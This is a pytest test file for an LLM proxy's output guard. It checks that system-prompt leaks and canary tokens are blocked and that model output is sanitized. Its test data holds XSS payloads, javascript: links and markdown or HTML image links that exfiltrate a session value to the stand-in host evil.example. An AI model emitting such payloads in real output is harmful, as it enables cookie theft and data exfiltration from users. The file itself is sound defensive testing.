from __future__ import annotations

import pytest

from proxy.config import SecurityPolicy
from proxy.models import Decision
from proxy.output_guard import LEAK_REPLACEMENT, OutputGuard, prompt_overlap


@pytest.fixture(scope="module")
def guard(policy: SecurityPolicy) -> OutputGuard:
    return OutputGuard(policy)


def rules(result) -> set[str]:
    return {f.rule_id for f in result.findings}


def test_clean_output_passes(guard: OutputGuard) -> None:
    text = "Deployments use blue/green. See [the runbook](https://acme-corp.com/runbook)."
    result = guard.inspect(text)
    assert result.decision is Decision.ALLOW
    assert result.sanitized_text == text
    assert result.findings == []


# --------------------------------------------------------------------------- #
# System prompt leakage (LLM07)
# --------------------------------------------------------------------------- #
def test_canary_token_blocks(guard: OutputGuard, policy: SecurityPolicy) -> None:
    result = guard.inspect(f"debug: {policy.output_guard.canary_token}")
    assert result.decision is Decision.BLOCK
    assert "OG-001" in rules(result)
    assert result.sanitized_text == LEAK_REPLACEMENT


def test_canary_case_insensitive(guard: OutputGuard, policy: SecurityPolicy) -> None:
    assert "OG-001" in rules(guard.inspect(policy.output_guard.canary_token.lower()))


def test_verbatim_system_prompt_dump_blocks(guard: OutputGuard, policy: SecurityPolicy) -> None:
    result = guard.inspect(f"Sure, here it is:\n{policy.agent.system_prompt}")
    assert result.decision is Decision.BLOCK
    assert "OG-002" in rules(result)


def test_partial_overlap_below_threshold(guard: OutputGuard) -> None:
    # A short phrase shared with the system prompt is not a leak.
    assert guard.inspect("I can help employees search internal documentation.").decision is Decision.ALLOW


def test_leak_phrase_flagged_only(guard: OutputGuard) -> None:
    result = guard.inspect("My system prompt is something I can't share.")
    assert "OG-003" in rules(result)
    assert result.decision is Decision.ALLOW


def test_prompt_overlap_function() -> None:
    sp = "one two three four five six seven eight"
    assert prompt_overlap(sp, sp, n=3) == 1.0
    assert prompt_overlap(sp, "nothing in common here at all", n=3) == 0.0
    assert prompt_overlap("too short", "too short", n=6) == 0.0


def test_leak_action_redact_mode(policy: SecurityPolicy) -> None:
    pol = policy.model_copy(deep=True)
    pol.output_guard.leak_action = "redact"
    result = OutputGuard(pol).inspect(f"ref {pol.output_guard.canary_token} ok")
    assert result.decision is Decision.SANITIZED
    assert pol.output_guard.canary_token not in result.sanitized_text


# --------------------------------------------------------------------------- #
# Improper output handling (LLM05)
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize(
    "payload",
    [
        "<script>alert(document.cookie)</script>",
        "<SCRIPT src='https://evil.example/x.js'></SCRIPT>",
        "<iframe src='https://evil.example'></iframe>",
        "<svg onload=alert(1)>",
        "<object data='x.swf'></object>",
        "<meta http-equiv='refresh' content='0;url=https://evil.example'>",
    ],
)
def test_dangerous_tags_removed(guard: OutputGuard, payload: str) -> None:
    result = guard.inspect(f"Hello {payload} world")
    assert result.decision is Decision.SANITIZED
    assert "OG-010" in rules(result)
    assert "<script" not in result.sanitized_text.lower()
    assert "<iframe" not in result.sanitized_text.lower()


def test_event_handlers_stripped(guard: OutputGuard) -> None:
    result = guard.inspect('<a href="/x" onclick="steal()">x</a> <img src="logo.png" onerror=alert(1)>')
    assert "OG-011" in rules(result)
    assert "onclick" not in result.sanitized_text and "onerror" not in result.sanitized_text


def test_onx_words_in_prose_not_touched(guard: OutputGuard) -> None:
    text = "Set online = true in the config."
    assert guard.inspect(text).sanitized_text == text


@pytest.mark.parametrize(
    "link",
    ["[click](javascript:alert(1))", "[x](JaVaScRiPt:alert(1))", "[x](vbscript:msgbox)", "[x](data:text/html,<b>)"],
)
def test_script_uris_neutralised(guard: OutputGuard, link: str) -> None:
    result = guard.inspect(link)
    assert "OG-012" in rules(result)
    assert "javascript:" not in result.sanitized_text.lower()


def test_markdown_image_exfiltration_removed(guard: OutputGuard) -> None:
    result = guard.inspect("Done! ![chart](https://evil.example/log?data=SECRET_SESSION)")
    assert "OG-013" in rules(result)
    assert "evil.example" not in result.sanitized_text
    assert "[image removed: chart]" in result.sanitized_text


def test_html_image_exfiltration_removed(guard: OutputGuard) -> None:
    result = guard.inspect('<img src="https://evil.example/p.gif?q=1">')
    assert "OG-013" in rules(result)


@pytest.mark.parametrize(
    "img", ["![logo](https://acme-corp.com/logo.png)", "![a](https://avatars.github.com/u/1)", "![rel](/static/a.png)"]
)
def test_allowlisted_images_kept(guard: OutputGuard, img: str) -> None:
    assert guard.inspect(img).sanitized_text == img


# --------------------------------------------------------------------------- #
# Credential exposure & limits
# --------------------------------------------------------------------------- #
def test_secrets_redacted_in_output(guard: OutputGuard) -> None:
    result = guard.inspect("Use token ghp_" + "Z9" * 18 + " to authenticate")
    assert result.decision is Decision.SANITIZED
    assert "[REDACTED:GITHUB_TOKEN]" in result.sanitized_text
    assert result.redactions[0].stage.value == "output_guard"


def test_pii_not_redacted_in_output_by_default(guard: OutputGuard) -> None:
    text = "Contact support@acme-corp.com"
    assert guard.inspect(text).sanitized_text == text


def test_pii_redaction_opt_in(policy: SecurityPolicy) -> None:
    pol = policy.model_copy(deep=True)
    pol.output_guard.redact_pii = True
    assert "[REDACTED:EMAIL_ADDRESS]" in OutputGuard(pol).inspect("mail bob@example.com").sanitized_text


def test_output_truncated(policy: SecurityPolicy) -> None:
    pol = policy.model_copy(deep=True)
    pol.output_guard.max_output_chars = 50
    result = OutputGuard(pol).inspect("x" * 500)
    assert "OG-020" in rules(result)
    assert result.decision is Decision.SANITIZED
    assert len(result.sanitized_text) < 100


def test_disabled_output_guard(policy: SecurityPolicy) -> None:
    pol = policy.model_copy(deep=True)
    pol.output_guard.enabled = False
    assert OutputGuard(pol).inspect("<script>x</script>").decision is Decision.ALLOW
